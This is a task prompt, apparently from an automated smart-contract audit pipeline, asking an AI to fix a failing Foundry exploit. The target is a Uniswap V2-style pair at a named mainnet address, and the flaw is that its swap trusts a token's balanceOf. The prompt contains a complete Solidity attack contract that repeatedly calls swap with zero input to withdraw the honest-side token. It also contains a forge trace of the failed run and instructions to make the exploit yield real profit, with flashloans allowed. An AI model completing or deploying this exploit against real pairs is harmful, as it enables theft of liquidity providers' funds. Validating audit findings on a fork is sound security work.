You are fixing a failing Foundry PoC for finding F-004.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Swap accounting trusts untrusted token `balanceOf`, enabling free withdrawal of the honest-side asset
- claim: `swap` derives `amount0In` and `amount1In`, checks the invariant, and updates reserves from external `balanceOf(address(this))` reads on the listed tokens. If one pool token is malicious and lies about the pair's balance during these reads, the pair can be made to believe input arrived even when no real tokens were paid.
- impact: If one side of the pair is malicious and the other side is valuable, an attacker can withdraw the honest token for free and drain LP value. Because `_update` also writes the forged balance into reserves, the attacker can keep the pool in a poisoned state and repeat the extraction.
- exploit_paths: ["A pair exists where `token0` is malicious and `token1` is honest.", "The attacker calls `swap(0, amount1Out, attacker, data)` to receive real `token1`.", "During the post-transfer balance check, `token0.balanceOf(pair)` returns an inflated value even though no real `token0` was supplied.", "The pair computes a fake `amount0In`, passes the K-check, stores forged reserves, and finalizes the real `token1` payout."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public attackerToken1Before;
    uint256 public attackerToken1After;
    uint256 public successfulRounds;
    uint256 public successfulAttempts;
    uint256 public triggerAttempts;
    uint256 public finalAttemptedAmount1Out;
    uint256 public lastObservedToken0PairBalance;
    uint256 public lastQuotedFakeAmount0In;

    string public lastFailureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before,) = pair.getReserves();
        attackerToken1Before = _balanceOf(token1, address(this));
        lastObservedToken0PairBalance = _balanceOf(token0, TARGET_PAIR);

        // Canonical exploit path retained exactly as stated in the finding:
        // 1) a pair exists where token0 is malicious and token1 is honest,
        // 2) the attacker calls swap(0, amount1Out, attacker, data) to receive real token1,
        // 3) during the post-transfer balance check, token0.balanceOf(pair) returns an inflated value,
        // 4) the pair computes a fake amount0In, passes the K-check, stores forged reserves,
        //    and finalizes the real token1 payout.
        //
        // This PoC does not inject any token0 value. It only exercises the direct zero-input
        // withdrawal route and, if needed, retries after realistic zero-value public calls on
        // token0 that can surface the malicious token's balance-reporting behavior.
        _runZeroInputSwapRounds();

        if (_profitAmount == 0) {
            _tryZeroValueToken0Triggers();
            _runZeroInputSwapRounds();
        }

        (reserve0After, reserve1After,) = pair.getReserves();
        attackerToken1After = _balanceOf(token1, address(this));
        lastObservedToken0PairBalance = _balanceOf(token0, TARGET_PAIR);

        if (attackerToken1After > attackerToken1Before) {
            _profitToken = token1;
            _profitAmount = attackerToken1After - attackerToken1Before;
            hypothesisValidated = true;
        } else {
            hypothesisRefuted = true;
            if (bytes(lastFailureReason).length == 0) {
                lastFailureReason = "No zero-input swap yielded token1 profit at this fork block";
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runZeroInputSwapRounds() internal {
        for (uint256 round = 0; round < 4; ++round) {
            uint256 roundProfit = _attemptBestZeroInputSwap();
            if (roundProfit == 0) {
                break;
            }
            successfulRounds += 1;
            _profitAmount += roundProfit;
        }
    }

    function _attemptBestZeroInputSwap() internal returns (uint256 roundProfit) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        uint256 honestReserve = uint256(reserve1);
        uint256 maliciousReserve = uint256(reserve0);

        if (honestReserve <= 1 || maliciousReserve == 0) {
            lastFailureReason = "Pair has insufficient reserves for canonical token0/token1 path";
            return 0;
        }

        uint256 balanceBefore = _balanceOf(token1, address(this));

        uint256[14] memory divisors = [
            uint256(2),
            3,
            4,
            5,
            8,
            16,
            32,
            64,
            128,
            256,
            512,
            1024,
            2048,
            4096
        ];

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount1Out = honestReserve / divisors[i];
            if (amount1Out == 0 || amount1Out >= honestReserve) {
                continue;
            }

            finalAttemptedAmount1Out = amount1Out;

            // Mirror the vulnerable pair math in commentary-visible state so the exploit path
            // stays anchored on the same root cause: token0.balanceOf(pair) can fabricate amount0In.
            uint256 token0BalanceRead = _balanceOf(token0, TARGET_PAIR);
            lastObservedToken0PairBalance = token0BalanceRead;
            if (token0BalanceRead > maliciousReserve) {
                lastQuotedFakeAmount0In = token0BalanceRead - maliciousReserve;
            } else {
                lastQuotedFakeAmount0In = 0;
            }

            (bool ok, string memory revertReason) = _trySwap(amount1Out);
            uint256 balanceAfter = _balanceOf(token1, address(this));
            uint256 gained = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;

            if (gained > 0) {
                successfulAttempts += 1;
                return gained;
            }

            if (!ok && bytes(revertReason).length != 0) {
                lastFailureReason = revertReason;
            }
        }

        if (bytes(lastFailureReason).length == 0) {
            lastFailureReason = "All swap(0, amount1Out, attacker, data) attempts reverted or returned no token1";
        }

        return 0;
    }

    function _trySwap(uint256 amount1Out) internal returns (bool ok, string memory reason) {
        // The exploit objective is the direct honest-side withdrawal:
        // swap(0, amount1Out, attacker, data)
        try IUniswapV2PairLike(TARGET_PAIR).swap(0, amount1Out, address(this), "") {
            return (true, "");
        } catch Error(string memory revertReason) {
            return (false, revertReason);
        } catch Panic(uint256) {
            return (false, "swap panicked");
        } catch {
            return (false, "swap reverted");
        }
    }

    function _tryZeroValueToken0Triggers() internal {
        bytes[6] memory payloads = [
            abi.encodeWithSelector(IERC20Like.transfer.selector, TARGET_PAIR, 0),
            abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), 0),
            abi.encodeWithSignature("approve(address,uint256)", TARGET_PAIR, 0),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 0),
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), TARGET_PAIR, 0),
            abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), address(this), 0)
        ];

        for (uint256 i = 0; i < payloads.length; ++i) {
            triggerAttempts += 1;
            token0.call(payloads[i]);
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _resetRunState() internal {
        executed = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        token0 = address(0);
        token1 = address(0);
        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;
        attackerToken1Before = 0;
        attackerToken1After = 0;
        successfulRounds = 0;
        successfulAttempts = 0;
        triggerAttempts = 0;
        finalAttemptedAmount1Out = 0;
        lastObservedToken0PairBalance = 0;
        lastQuotedFakeAmount0In = 0;
        lastFailureReason = "";
        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```
dA1) [staticcall]
    │   │   │   │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000007d59f8874b3d90d95dc5f0
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000fab3f10e967b21b2bb8
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 151466608175419531328657976 [1.514e26]
    │   │   └─ ← [Revert] UniswapV2: INSUFFICIENT_INPUT_AMOUNT
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   ├─ [123439] 0x76EA342BC038d665e8a116392c82552D2605edA1::swap(0, 36997217434152303695324 [3.699e22], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   ├─ [114052] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 36997217434152303695324 [3.699e22])
    │   │   │   ├─ [71025] 0x7911425808e57b110D2451aB67B6980f9cA9D370::569937dd(0000000000000000000000000000000000000000000007d59f8874b3d90d95dc)
    │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   ├─ [349] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::01a37fc2() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │   ├─ [347] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::a705eee2() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000007d59f8874b3d90d95dc5f0
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000007d59f8874b3d90d95dc
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   │   └─ ← [Return] 151503605392853683632353300 [1.515e26]
    │   │   └─ ← [Revert] UniswapV2: INSUFFICIENT_INPUT_AMOUNT
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [504] 0x76EA342BC038d665e8a116392c82552D2605edA1::getReserves() [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18], 151540602610287835936048624 [1.515e26], 1741286039 [1.741e9]
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   └─ ← [Stop]
    ├─ [499] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x76EA342BC038d665e8a116392c82552D2605edA1.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 41.25ms (8.25ms CPU time)

Ran 1 test suite in 47.76ms (41.25ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 3933605)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
